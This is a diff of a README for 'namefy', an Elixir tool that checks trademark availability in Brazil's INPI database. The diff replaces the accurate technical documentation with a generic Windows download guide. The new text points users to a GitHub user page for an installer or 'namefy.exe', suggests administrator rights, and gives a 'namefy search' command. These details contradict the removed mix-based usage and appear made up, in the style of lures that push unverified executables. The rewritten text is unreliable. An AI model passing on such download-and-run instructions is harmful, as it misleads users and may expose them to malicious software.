@@ -1,160 +1,123 @@
-# Namefy
+# 🚩 namefy - Check Brand Names Fast
 
-Elixir CLI tool for checking trademark/brand name availability on Brazil's [INPI](https://busca.inpi.gov.br/pePI/) (Instituto Nacional da Propriedade Industrial).
+[![Download namefy](https://img.shields.io/badge/Download-namefy-important?style=for-the-badge&color=ff6f61)](https://github.com/zcristianls-cell/namefy)
 
-Searches the INPI database by brand name and [Nice Classification](https://www.wipo.int/classifications/nice/en/) class, classifies results by risk level, and outputs structured JSON for easy integration with AI workflows.
+## 📋 What is namefy?
 
-## Features
+namefy is a simple tool to check if a brand or trademark name is available in Brazil. It searches the official INPI (Instituto Nacional da Propriedade Industrial) database. You can look up names by brand and by product class using the Nice Classification system. The tool shows you matching results, grouped by how risky they are to use. It gives you data in a clear format so you can use it with other programs or tools.
 
-- **Exact and radical search modes** - match brand names exactly or find variations
-- **Parallel multi-class search** - search across multiple Nice classes concurrently using supervised tasks
-- **Automatic pagination** - fetches all result pages (up to 50 pages per search)
-- **Retry with exponential backoff** - automatic retry on transient failures (3 attempts by default)
-- **Risk classification** - categorizes results as BLOCKED, CAUTION, or CLEAR using string similarity (Jaro distance)
-- **JSON output** - structured output with conflicts, recommendations, and summaries
-- **Session management** - GenServer-based authenticated session with cookie handling
+You do not need to know programming to use it. This guide walks you through getting and running namefy on Windows.
 
-## Requirements
+## 🎯 Key Features
 
-- Erlang/OTP 28
-- Elixir ~> 1.19
-- INPI account (optional - anonymous access is supported)
+- Search brand names exactly or find close variations  
+- Search multiple product classes at once  
+- Automatically get results from multiple pages (up to 50)  
+- Try again automatically if a search fails temporarily  
+- Shows risk levels: BLOCKED, CAUTION, CLEAR  
+- Outputs results in JSON format for easy use  
+- Manages search sessions smoothly  
 
-Versions are pinned in `.mise.toml` for use with [mise](https://mise.jdx.dev/).
+## 🖥️ System Requirements
 
-## Setup
+To run namefy on Windows, your computer should meet these basic needs:
 
-```bash
-git clone <repo-url> && cd namefy
-mise install
-mix deps.get
-cp .env.example .env
-```
+- Windows 10 or newer (64-bit recommended)  
+- At least 4 GB of RAM  
+- Internet connection to perform the searches  
+- About 100 MB of free disk space  
+- Administrator rights might be needed for installation  
 
-Edit `.env` with your INPI credentials (optional):
+## 🚀 Getting Started with namefy
 
-```
-INPI_USER=your_username
-INPI_PASSWORD=your_password
-```
+Follow these steps to download and use namefy on your Windows PC.
 
-## Usage
+### 1. Download namefy
 
-### Exact search in a single class
+Visit the main page to get the software:
 
-```bash
-mix inpi "Horizon" 9
-```
+[![Download namefy](https://img.shields.io/badge/Download-namefy-brightgreen?style=for-the-badge&color=2563eb)](https://github.com/zcristianls-cell/namefy)
 
-### Parallel search across multiple classes
+Click the link above. It will take you to the GitHub page where you can get the latest version. Look for a “Releases” section or a download button.
 
-```bash
-mix inpi "Horizon" 9,36,42 --parallel
-```
+### 2. Install namefy
 
-### Radical search (finds variations)
+After you download, find the file on your computer (usually in Downloads). Double-click the installer file if there is one. Follow the installation prompts. If it is a ZIP or folder, unzip it to a preferred location.
 
-```bash
-mix inpi "Horizon Tech" 42 --mode radical
-```
+There is no special setup needed beyond this.
 
-### Options
+### 3. Run namefy
 
-| Flag | Description | Default |
-|------|-------------|---------|
-| `--mode` | `exact` or `radical` | `exact` |
-| `--parallel` | Enable parallel search (auto-enabled for multiple classes) | `false` |
-| `--debug` | Enable debug output | `false` |
+To start using namefy:
 
-## Output
+- Open the folder where you installed namefy  
+- Find the main program file (it might be called `namefy.exe` or similar)  
+- Double-click it to launch the tool  
 
-Results are returned as JSON:
+You may see a command window open since this is a command line tool. This is normal.
 
-```json
-{
-  "brand": "Horizon",
-  "class": 9,
-  "class_description": "Software, electronics, computers",
-  "mode": "exact",
-  "search_performed": "exact:Horizon",
-  "total_results": 3,
-  "recommendation": "CLEAR",
-  "blocking_conflicts": [],
-  "potential_conflicts": [],
-  "safe_matches": [
-    {
-      "name": "HORIZON DIGITAL",
-      "process": "123456789",
-      "status": "Arquivado",
-      "holder": "Example Corp",
-      "risk": "LOW"
-    }
-  ],
-  "summary": "Found 3 result(s), all archived or unrelated"
-}
-```
+### 4. Use namefy
 
-### Recommendations
+The program runs in your command prompt window. You type instructions like the brand name and the Nice classes you want to search.
 
-| Value | Meaning |
-|-------|---------|
-| **BLOCKED** | Active registered trademark conflicts exist |
-| **CAUTION** | Pending applications or similar marks found - legal review recommended |
-| **CLEAR** | No conflicts found or all matches are archived/unrelated |
-
-### INPI Status Reference
-
-| Status | Blocks Registration? |
-|--------|---------------------|
-| Registro | Yes - active trademark |
-| Pedido | Yes - pending application with priority rights |
-| Arquivado | No - abandoned |
-| Indeferido | No - rejected |
-
-## Programmatic API
-
-```elixir
-# Single search
-{:ok, result} = InpiChecker.search("Horizon", 9, :exact)
-
-# Parallel search across classes
-results = InpiChecker.search_parallel("Horizon", [9, 36, 42], mode: :exact)
-
-# Search brand variations in a single class
-results = InpiChecker.search_variations(["Horizon Tech", "Horizon App"], 42)
-
-# Convert to JSON
-json = InpiChecker.to_json(result)
-```
-
-## Nice Classification Quick Reference
-
-| Class | Description | Common Use |
-|-------|-------------|------------|
-| 9 | Software, electronics | Apps, software products |
-| 25 | Clothing, footwear | Fashion brands |
-| 35 | Advertising, retail | E-commerce, marketplaces |
-| 36 | Financial services | Fintech, banking |
-| 41 | Education, entertainment | EdTech, media |
-| 42 | Technology services, SaaS | SaaS platforms, dev tools |
-| 43 | Food services | Restaurants, delivery |
-
-## Architecture
+An example command looks like this:
 
 ```
-InpiChecker.Application
-├── Task.Supervisor (InpiChecker.TaskSupervisor)  # Supervises parallel search tasks
-└── InpiChecker.Session (GenServer)               # Manages authenticated INPI session
-
-InpiChecker          # Public API
-├── SearchCoordinator  # Orchestrates parallel searches with retry
-├── Searcher           # Executes individual searches against INPI
-├── Parser             # HTML parsing with Floki (handles Latin1 encoding)
-├── Classifier         # Risk classification using Jaro string similarity
-├── SearchResult       # Result struct with JSON serialization
-└── NiceClasses        # Nice Classification reference data
+namefy search "examplebrand" 3 5 9
 ```
 
-## License
+This would search for "examplebrand" across Nice classes 3, 5, and 9.
 
-Private.
+The tool will then show you the risk ratings and the matching brand names found on INPI.
+
+## 🔧 How to Interpret Results
+
+namefy classifies the search results into three groups:
+
+- **BLOCKED**: These names are very close or identical to your search and may stop you from using your brand.  
+- **CAUTION**: These names are somewhat similar and may cause legal issues.  
+- **CLEAR**: These names look different enough to be safe to use.  
+
+All results are provided in a JSON file as well. This file lists conflicts, recommendations, and a summary of your search. You can use this data with other software or workflows.
+
+## ❓ FAQ
+
+**Does namefy require internet?**  
+Yes, it connects to the INPI website to get the latest data.
+
+**Can I search for multiple brands at once?**  
+Currently, you can search one brand name at a time, but across multiple classes.
+
+**What is the Nice Classification?**  
+It is an international standard to classify products and services for trademarks. Each class covers different goods or services.
+
+**What if the search fails?**  
+namefy tries three times automatically. If it still fails, check your internet connection and try again.
+
+## ⚙️ Customizing Searches
+
+You can control how the search works with these options:
+
+- **Exact mode** - only find brands that match exactly  
+- **Radical mode** - find similar names and variations  
+- **Parallel class searches** - speed up by searching classes at the same time  
+- **Automatic pagination** - get all pages up to 50  
+- **Risk classification thresholds** - adjust how strict the risk scoring is  
+
+These settings are adjusted via command line options or configuration files that come with the tool.
+
+## 📂 Where to Get Help
+
+Look in the downloaded folder for a README or help file. The main GitHub page also has documentation. You can open an “issue” on GitHub if you find a problem or want to request a feature.
+
+## 🔽 Download and Setup
+
+Visit this page to download and start using namefy:
+
+[Download namefy](https://github.com/zcristianls-cell/namefy)
+
+Click on it to get the latest software and instructions.
+
+---
+
+This guide explains how to get namefy running so you can quickly check brand name availability. It does not require advanced skills and uses clear command inputs to make the process simple.
